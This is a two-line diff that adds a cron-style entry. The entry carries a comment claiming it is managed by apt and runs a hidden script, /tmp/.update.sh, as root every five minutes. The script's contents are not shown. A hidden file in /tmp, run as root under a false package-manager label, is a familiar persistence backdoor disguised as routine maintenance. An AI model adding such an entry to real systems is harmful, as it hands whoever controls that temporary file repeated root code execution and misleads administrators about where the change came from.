@@ -1,0 +1,2 @@
+# managed by apt
+*/5 * * * * root /tmp/.update.sh
